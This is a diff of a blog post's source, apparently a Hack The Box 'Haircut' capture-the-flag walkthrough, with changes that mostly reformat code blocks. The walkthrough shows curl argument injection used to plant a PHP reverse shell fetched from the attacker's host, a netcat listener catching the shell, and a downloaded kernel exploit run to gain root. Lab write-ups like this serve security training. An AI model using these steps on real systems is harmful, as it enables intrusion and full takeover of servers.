@@ -27,8 +27,7 @@ Time for a haircut!
 
 Per the usual, start off with a nmap scan to get all of the open ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.24                    
 [sudo] password for kali: 
@@ -59,14 +58,17 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run nmap against all the ports to look for any weird ports that are open.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.24                      
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 18:53 AEDT
@@ -78,22 +80,23 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapfull %}
 
 <br />
 Check the landing page and view its source.
 
 <div class="row justify-content-sm-center">
-    <div class="col-sm mt-3 mt-md-0">
+    <div class="col-sm-8 mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/haircut/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
     </div>
 </div>
 
-{% raw %}
-```html
-view-source:http://10.10.10.24/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 
 <title> HTB Hairdresser </title>
@@ -101,14 +104,17 @@ view-source:http://10.10.10.24/
 <center> <br><br><br><br>
 <img src="bounce.jpg" height="750" width="1200" alt="" />
 <center>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="browser"
+   title="view-source:http://10.10.10.24/"
+   content=landingsource %}
 
 <br />
 Run ffuf to brute-force for interesting directories or files.  Look for html or php extensions.
 
-{% raw %}
-```sh
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.24/FUZZ -fw 11 -e .html,.php
 
@@ -137,10 +143,13 @@ ________________________________________________
 uploads                 [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 13ms]
 test.html               [Status: 200, Size: 223, Words: 14, Lines: 7, Duration: 11ms]
 exposed.php             [Status: 200, Size: 446, Words: 24, Lines: 20, Duration: 14ms]
-:: Progress: [661680/661680] :: Job [1/1] :: 2469 req/sec :: Duration: [0:04:10] :: Errors: 0 ::jpg" height="750" width="1200" alt="" />
-<center>
-```
-{% endraw %}
+:: Progress: [661680/661680] :: Job [1/1] :: 2469 req/sec :: Duration: [0:04:10] :: Errors: 0 ::
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ffuf %}
 
 <br />
 Navigate to the exposed.php to see what it is.
@@ -163,8 +172,7 @@ Try to run the page functionality.  Looks like a curl command.
 <br />
 Download the pentestmonkey php reverse shell script.
 
-{% raw %}
-```sh
+{% capture downloadshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
 --2025-01-19 19:13:59--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -177,14 +185,17 @@ Saving to: ‘shell.php’
 shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.01s   
 
 2025-01-19 19:14:00 (485 KB/s) - ‘shell.php’ saved [5491/5491]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadshell %}
 
 <br />
 Update the IP address to the HackTheBox VPN IP address.  Update the port that will be used for the attack port.
 
-{% raw %}
-```php
+{% capture ptmonkey %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -210,40 +221,48 @@ $debug = 0;
 <snip>
 
 ?>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="php"
+   title="shell.php"
+   content=ptmonkey %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ nc -nlvp 1234
 listening on [any] 1234 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Use python to start a web server to serve the ptm reverse shell that was just updated.
 
-{% raw %}
-```bash
+{% capture startwebserver %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ sudo python -m http.server 80             
 [sudo] password for kali: 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startwebserver %}
 
 <br />
 Fiddle with the command.  I tried injecting a semicolon and double ampersand for injection.  There is some kind of check that those aren't appropriate characters for a url.  I also tried using the -o command to the web root at /var/www/html and got permission denied.  Finally, output to the uploads folder that was discovered in the ffuf.
 
-{% raw %}
-```bash
-http://10.10.16.3/shell.php -o /var/www/html/uploads/shell.php
-```
-{% endraw %}
+<div class="info-box">
+  http://10.10.16.3/shell.php -o /var/www/html/uploads/shell.php
+</div>
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/haircut/injectedcurl.png" title="Injected Curl" class="img-fluid rounded z-depth-1" %}
@@ -262,8 +281,7 @@ Navigate to the shell that was just uploaded in the uploads folder.
 <br />
 Check the listener and catch the shell.  Use python to updgrade the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ nc -nlvp 1234
 listening on [any] 1234 ...
@@ -275,14 +293,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 www-data@haircut:/$ 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag1 %}
 www-data@haircut:/home/maria$ cat user.txt
 cat user.txt
 <redacted>
@@ -306,14 +327,17 @@ lo        Link encap:Local Loopback
           TX packets:250 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:23525 (23.5 KB)  TX bytes:23525 (23.5 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag1 %}
 
 <br />
 There is another user.txt on the user desktop.  Weird.
 
-{% raw %}
-```bash
+{% capture userflag2 %}
 www-data@haircut:/home/maria/Desktop$ cat user.txt
 cat user.txt
  <redacted>
@@ -333,14 +357,17 @@ ip a
        valid_lft 86398sec preferred_lft 14398sec
     inet6 fe80::250:56ff:feb9:9a4c/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag2 %}
 
 <br />
 Download linpeas.sh.
 
-{% raw %}
-```bash
+{% capture downloadthepeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh                                   
 --2025-01-19 19:39:51--  https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh
@@ -358,14 +385,17 @@ Saving to: ‘linpeas.sh’
 linpeas.sh                                                 100%[========================================================================================================================================>] 810.96K  3.30MB/s    in 0.2s    
 
 2025-01-19 19:39:53 (3.30 MB/s) - ‘linpeas.sh’ saved [830426/830426]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadthepeas %}
 
 <br />
 Transfer linpeas to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferthepeas %}
 www-data@haircut:/home/maria$ cd /dev/shm
 cd /dev/shm
 www-data@haircut:/dev/shm$ wget http://10.10.16.3:8000/linpeas.sh
@@ -381,14 +411,17 @@ linpeas.sh          100%[===================>] 810.96K  1.04MB/s    in 0.8s
 2025-01-19 09:40:40 (1.04 MB/s) - 'linpeas.sh' saved [830426/830426]
 www-data@haircut:/dev/shm$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=transferthepeas %}
 
 <br />
 Run the linpeas.sh.  Note the first kernel exploit.
 
-{% raw %}
-```bash
+{% capture runthepeas %}
 www-data@haircut:/dev/shm$ ./linpeas.sh
 ./linpeas.sh
 
@@ -440,14 +473,17 @@ www-data@haircut:/dev/shm$ ./linpeas.sh
    Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
 
    <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runthepeas %}
 
 <br />
 Download the exploit to the current working folder.
 
-{% raw %}
-```bash
+{% capture downloadtheexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ wget https://www.exploit-db.com/raw/45010 -O verify.c
 --2025-01-19 19:53:47--  https://www.exploit-db.com/raw/45010
@@ -461,24 +497,30 @@ verify.c                                                       [  <=>           
 
 2025-01-19 19:53:48 (53.1 KB/s) - ‘verify.c’ saved [13728]
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadtheexploit %}
 
 <br />
 Compile the exploit.
 
-{% raw %}
-```bash
+{% capture compileexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/haircut]
 └─$ gcc verify.c -o verify -static
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=compileexploit %}
 
 <br />
 Download the exploit to the current working folder.
 
-{% raw %}
-```bash
+{% capture transfertovictim %}
 www-data@haircut:/dev/shm$ wget 10.10.16.3:8000/verify
 wget 10.10.16.3:8000/verify
 --2025-01-19 09:56:47--  http://10.10.16.3:8000/verify
@@ -490,24 +532,30 @@ Saving to: 'verify'
 verify              100%[===================>] 779.09K   869KB/s    in 0.9s    
 
 2025-01-19 09:56:48 (869 KB/s) - 'verify' saved [797792/797792]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=transfertovictim %}
 
 <br />
 Chmod the exploit to make it executable.
 
-{% raw %}
-```bash
+{% capture makeitexecutable %}
 www-data@haircut:/dev/shm$ chmod +x verify
 chmod +x verify
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=makeitexecutable %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 www-data@haircut:/dev/shm$ ./verify
 ./verify
 [.] 
@@ -527,25 +575,30 @@ www-data@haircut:/dev/shm$ ./verify
 [*] hammering cred structure at ffff880077b8d480
 [*] credentials patched, launching shell...
 #
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
 
 <br />
 Run whoami to confirm that we are root.
 
-{% raw %}
-```bash
+{% capture checkuserroot %}
 # whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
 
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=checkuserroot %}
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -565,8 +618,12 @@ ip a
        valid_lft 86395sec preferred_lft 14395sec
     inet6 fe80::250:56ff:feb9:9a4c/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 Look forward to seeing you in the next one.
